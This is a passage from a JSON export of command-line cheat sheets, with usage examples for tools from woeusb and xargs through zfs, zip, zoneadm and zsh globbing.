          "content": "### Supported bootable USB creation methods:\n\n# Completely WIPE the entire USB storage device, then build a bootable Windows USB device from scratch:\nwoeusb --device <source media path> <device>\n\n# Copy Windows files to an existing partition of a USB storage device and make it bootable.  This allows files to coexist as long as no filename conflict exists:\nwoeusb --partition <source media path> <partition>\n\n\n\n### Command Line Options:\n\n# Verbose mode:\nwoeusb -v\n\n# Specify the filesystem to use as the target partition's filesystem:\nwoeusb --tgt-fs <FAT/NTFS>\n"
        },
        {
          "name": "xargs",
          "type": "blob",
          "size": 0.4697265625,
          "content": "# To Find all file name ending with .pdf and remove them\nfind -name *.pdf | xargs rm -rf\n\n# if file name contains spaces you should use this instead\nfind -name *.pdf | xargs -I{} rm -rf '{}'\n\n# Will show every .pdf like:\n#\t&toto.pdf=\n#\t&titi.pdf=\n# -n1 => One file by one file. ( -n2 => 2 files by 2 files )\n\nfind -name *.pdf | xargs -I{} -n1 echo '&{}='\n\n# If find returns no result, do not run rm\n# This option is a GNU extension.\nfind -name \"*.pdf\" | xargs --no-run-if-empty rm\n"
        },
        {
          "name": "xdotool",
          "type": "blob",
          "size": 0.1142578125,
          "content": "# Stroke each the letter b each 1000 millisecond and repeat it 3600 times.\nxdotool key  --repeat 3600 --delay 1000 b\n"
        },
        {
          "name": "xmlto",
          "type": "blob",
          "size": 0.32421875,
          "content": "# To convert DocBook XML to PDF\nxmlto pdf mydoc.xml\n\n# To convert DocBook XML to HTML\nxmlto -o html-dir html mydoc.xml\n\n# To convert DocBook XML to single HTML file\nxmlto html-nochunks mydoc.xml\n\n# To modify output with XSL override\nxmlto -m ulink.xsl pdf mydoc.xml\n\n# To use non-default xsl\nxmlto -x mystylesheet.xsl pdf mydoc.xml\n"
        },
        {
          "name": "xrandr",
          "type": "blob",
          "size": 0.3115234375,
          "content": "# To enable HDMI2 output with maximal resolution:\nxrandr --output HDMI2 --auto\n\n# To enable HDMI2 output with specific resolution:\nxrandr --output HDMI2 --mode 1280x800\n\n# To enable HDMI2 output next to HDMI1 output:\nxrandr --output HDMI2 --auto --right-of HDMI1\n\n# To disable HDMI2 output:\nxrandr --output HDMI2 --off\n"
        },
        {
          "name": "xxd",
          "type": "blob",
          "size": 0.23046875,
          "content": "# To convert bin/string to hex:\necho '42 is the solution' | xxd -p\n# output: 34322069732074686520736f6c7574696f6e0a\n\n# To convert hex to bin/string:\necho '34322069732074686520736f6c7574696f6e0a' | xxd -r -p\n# output: 42 is the solution\n"
        },
        {
          "name": "yaourt",
          "type": "blob",
          "size": 0.826171875,
          "content": "---\ntags: [ packaging ]\n---\n# All pacman commands are working the same way with yaourt.\n# Just check the pacman cheatsheet.\n# For instance, to install a package: \npacman -S <package>\nyaourt -S <package>\n# The difference is that yaourt will also query the Arch User Repository,\n# and if appropriate, donwload the source and build the package requested.\n\n# Here are the commands yaourt provides while pacman doesn't :\n\n# To search for <package> and install it:\nyaourt <package>\n\n# To update the local package base and upgrade all out of date package,\n# including the ones from AUR and the packages based on development repos (git,\n# svn, hg...)\nyaourt -Suya --devel\n\n# For all of the above commands, if you want yaourt to stop asking constantly for confirmations, \nuse the option --noconfirm\n\n# To build <package> from source:\nyaourt -Sb <package>\n"
        },
        {
          "name": "youtube-dl",
          "type": "blob",
          "size": 0.888671875,
          "content": "# To download a video in 720p MP4:\nyoutube-dl -f 22 example.com/watch?v=id\n\n# To download a video in 720p MP4 or WebM or FLV:\nyoutube-dl -f 22/45/120\n\n# To list all available formats of a video:\nyoutube-dl -F example.com/watch?v=id\n\n# To download a video to /$uploader/$date/$title.$ext:\nyoutube-dl -o '%(uploader)s/%(date)s/%(title)s.%(ext)s' example.com/watch?v=id\n\n# To download a video playlist starting from a certain video:\nyoutube-dl --playlist-start 5 example.com/watch?v=id&list=listid\n\n# To simulate a download with youtube-dl:\nyoutube-dl -s example.com/watch?v=id\n\n# To download audio in mp3 format with best quality available\nyoutube-dl --extract-audio --audio-format mp3 --audio-quality 0 example.com/watch?v=id\n\n# For all video formats see link below (unfold \"Comparison of YouTube media encoding options\")\n# https://en.wikipedia.org/w/index.php?title=YouTube&oldid=723160791#Quality_and_formats\n"
        },
        {
          "name": "yum",
          "type": "blob",
          "size": 0.7080078125,
          "content": "---\ntags: [ packaging ]\n---\n# To install the latest version of a package:\nyum install <package>\n\n# To perform a local install:\nyum localinstall <package>\n\n# To remove a package:\nyum remove <package>\n\n# To search for a package:\nyum search <package>\n\n# To find what package installs an executable:\nyum whatprovides <executable>\n\n# To find the dependencies of a package:\nyum deplist <package>\n\n# To find information about a package:\nyum info <package>\n\n# List currently enabled repositories:\nyum repolist\n\n# List packages matching <phrase>:\nyum list <phrase>\n \n# To download the source RPM for a package:\nyumdownloader --source <package>\n\n# (You have to install yumdownloader first, which is installed by the yum-utils package)\n"
        },
        {
          "name": "z",
          "type": "blob",
          "size": 0.296875,
          "content": "# To `cd` to most frecent dir matching `foo`:\nz foo\n\n# To `cd` to most frecent dir matching `foo`, then `bar`:\nz foo bar\n\n# To `cd` to highest ranked dir matching `foo`:\nz -r foo\n\n# To `cd` to most recently accessed dir matching `foo`:\nz -t foo\n\n# To list all dirs matching `foo` - by frecency:\nz -l foo\n"
        },
        {
          "name": "zfs",
          "type": "blob",
          "size": 3.751953125,
          "content": "# WARNING:\n#   In order to avoid headaches when moving ZFS physical devices around,\n#   one will be much better served to reference devices by their *immutable*\n#   ID - as in /dev/disk/by-id/* - rather than their block device name -\n#   as in /dev/{sd,nvme}* - which is bound to change as per PCI enumeration\n#   order.\n# For the sake of briefness, we'll use the following variables:\n#   ${device}    device (/dev/disk/by-id/${device})\n#   ${part}      partition (/dev/disk/by-id/${part=${device}-part${N}})\n#   ${pool}      ZFS pool (name)\n#   ${fs_vol}    ZFS file system or volume (name)\n#   ${snapshot}  ZFS snapshot (name)\n\n\n## Pools\n\n# Create a new \"RAID-5\" (raidz1) pool\n# Recommended: use entire devices rather than partitions\nzpool create ${pool} raidz1 ${device} ${device} ${device} [...]\n\n# Add 2nd-level \"RAID-1\" (mirror) ZFS Intent Log (ZIL; synchronous write cache):\n# Recommended: use separate, fast, low-latency devices (e.g. NVMe)\nzpool add ${pool} log mirror ${part} ${part}\n\n# Add 2nd-level \"RAID-0\" Adaptive Replacement Cache (ARC; read cache):\n# Recommended: use separate, fast, low-latency devices (e.g. NVMe)\nzpool add ${pool} cache ${part} ${part} [...]\n\n# Remove log or cache components:\nzpool remove zfs ${part} [...]\n\n# Import (enable) existing pool from newly connected devices:\n# Note: this will create the /etc/zfs/zpool.cache devices cache\nzpool import -d /dev/disk/by-id -aN\n\n# Import (enable) existing pool using the devices cache:\nzpool import -c /etc/zfs/zpool.cache -aN\n\n# Export (disable) pool (e.g. before shutdown):\nzpool export -a\n\n# List all (imported) pools:\nzpool list\n\n# See pool status:\nzpool status ${pool}\n\n# See detailed pool I/O statistics:\nzpool iostat ${pool} -v\n\n# Verify pool integrity (data checksums):\n# (watch progress with 'zpool status')\nzpool scrub ${pool}\n\n# Remove a failing device from a pool:\n# Note: redundant pools (mirror, raidz) will continue working in degraded state\nzpool detach ${pool} ${device}\n\n# Replace a failed device in a pool:\n# Note: new device will be \"resilvered\" automatically (parity reconstruction)\n#       (watch progress with 'zpool status')\nzpool replace ${pool} ${failed-device} ${new-device}\n\n# Erase zpool labels (\"superblock\") from a device/partition:\n# WARNING: MUST do before reusing a device/partition for other purposes\nzpool labelclear ${device}\n\n# Query pool configuration (properties):\nzpool get all ${pool}\n\n# Change pool configuration (property):\nzpool set <property>=<value> ${pool}\n\n# Dump the entire pool (commands) history:\nzpool history ${pool}\n\n# More...\nman zpool\n\n\n## File systems / Volumes\n\n# Create a new file system:\nzfs create ${pool}/${fs_vol}\n\n# Create a new volume (\"block device\"):\n# Note: look for it in /dev/zvol/${pool}/${fs_vol}\nzfs create -V <size> ${pool}/${fs_vol}\n\n# List all file systems / volumes:\nzfs list\n\n# Mount all file systems:\n# Note: see 'zfs get mountpoint ${pool}' for mountpoint root path\nzfs mount -a\n\n# Create a snapshot:\nzfs snapshot ${pool}/${fs_vol}@${snapshot}\n\n# Delete a snapshot:\nzfs destroy ${pool}/${fs_vol}@${snapshot}\n\n# Delete a range of snapshots:\nzfs destroy ${pool}/${fs_vol}@${first-snapshot}%${last-snapshot}\n\n\n# Full backup:\n# Note: pipe (|) source to destination through netcat, SSH, etc.\n# ... on source:\nzfs send -p -R ${pool}/${fs_vol}@${snapshot}\n# ... on destination:\nzfs receive -F ${pool}/${fs_vol}\n\n# Incremental backup:\n# Note: pipe (|) source to destination through netcat, SSH, etc.\n# ... on source:\nzfs send -p -R -i ${pool}/${fs_vol}@${snapshot-previous} ${pool}/${fs_vol}@${snapshot}\n# ... on destination:\nzfs receive -F ${pool}/${fs_vol}\n\n# Query file system / volume configuration (properties):\nzfs get all ${pool}\nzfs get all ${pool}/${fs_vol}\n\n# Change file system / volume configuration (property):\nzfs set <property>=<value> ${pool}/${fs_vol}\n\n# More...\nman zfs\n\n"
        },
        {
          "name": "zip",
          "type": "blob",
          "size": 0.3466796875,
          "content": "# To create zip file:\nzip archive.zip file1 directory/\n\n# To create zip file from directory:\nzip -r archive.zip directory/\n\n# To create zip file with password:\nzip -P password archive.zip file1\n\n# To join a split zip file (.zip, .z01, .z02, etc):\nzip -FF splitZipfile.zip --out joined.zip\n\n# To list, test and extract zip archives, see unzip:\ncheat unzip\n"
        },
        {
          "name": "zoneadm",
          "type": "blob",
          "size": 0.3232421875,
          "content": "# To halt a zone:\nzoneadm -z <zone> halt\n\n# To delete a zone :\nzoneadm -z <zone> halt\nzoneadm -z <zone> uninstall\n\n# To verify a zone:\nzoneadm -z <zone> verify\n\n# To install a zone:\nzoneadm -z <zone> install\n\n# To boot a zone:\nzoneadm -z <zone> boot\n\n# To reboot a zone:\nzoneadm -z <zone> reboot\n\n# To list zones:\nzoneadm list -cv\n"
        },
        {
          "name": "zsh",
          "type": "blob",
          "size": 2.6044921875,
          "content": "# A plain old glob\nprint -l *.txt\nprint -l **/*.txt\n\n# Show text files that end in a number from 1 to 10\nprint -l **/*<1-10>.txt\n\n# Show text files that start with the letter a\nprint -l **/[a]*.txt\n\n# Show text files that start with either ab or bc\nprint -l **/(ab|bc)*.txt\n\n# Show text files that don't start with a lower or uppercase c\nprint -l **/[^cC]*.txt\n\n# Show only directories\nprint -l **/*(/)\n\n# Show only regular files\nprint -l **/*(.)\n\n# Show empty files\nprint -l **/*(L0)\n\n# Show files greater than 3 KB\nprint -l **/*(Lk+3)\n\n# Show files modified in the last hour\nprint -l **/*(mh-1)\n\n# Sort files from most to least recently modified and show the last 3\nprint -l **/*(om[1,3])\n\n# `.` show files, `Lm-2` smaller than 2MB, `mh-1` modified in last hour,\n# `om` sort by modification date, `[1,3]` only first 3 files\nprint -l **/*(.Lm-2mh-1om[1,3])\n\n# Show every directory that contain directory `.git`\nprint -l **/*(e:'[[ -d $REPLY/.git ]]':)\n\n# Return the file name (t stands for tail)\nprint -l *.txt(:t)\n\n# Return the file name without the extension (r stands for remove_extension)\nprint -l *.txt(:t:r)\n\n# Return the extension\nprint -l *.txt(:e)\n\n# Return the parent folder of the file (h stands for head)\nprint -l *.txt(:h)\n\n# Return the parent folder of the parent\nprint -l *.txt(:h:h)\n\n# Return the parent folder of the first file\nprint -l *.txt([1]:h)\n\n# Parameter expansion\nfiles=(*.txt)          # store a glob in a variable\nprint -l $files\nprint -l $files(:h)    # this is the syntax we saw before\nprint -l ${files:h}\nprint -l ${files(:h)}  # don't mix the two, or you'll get an error\nprint -l ${files:u}    # the :u modifier makes the text uppercase\n\n# :s modifier\nvariable=\"path/aaabcd\"\necho ${variable:s/bc/BC/}    # path/aaaBCd\necho ${variable:s_bc_BC_}    # path/aaaBCd\necho ${variable:s/\\//./}     # path.aaabcd (escaping the slash \\/)\necho ${variable:s_/_._}      # path.aaabcd (slightly more readable)\necho ${variable:s/a/A/}      # pAth/aaabcd (only first A is replaced)\necho ${variable:gs/a/A/}     # pAth/AAAbcd (all A is replaced)\n\n# Split the file name at each underscore\necho ${(s._.)file}\n\n# Join expansion flag, opposite of the split flag.\narray=(a b c d)\necho ${(j.-.)array} # a-b-c-d\n\n# Short if\nif [[ ... ]] command\nif [[ ... ]] { command ... }\n\n# Short for\nfor i ( word ... ) command\nfor i ( word ... ) { command ... }\nfor i in word ... ; command\n\n# Short while/until\nwhile [[ ... ]] { command ... }\nuntil [[ ... ]] { command ... }\n\n# Use output of command, when using pipe is not possible\n<( command )\n\n# Similar to <( ), but creates temporary file (instead of FD or FIFO), when\n# program needs to seek in output.\n=( command )\n"
        }
      ]
    }
  ]
}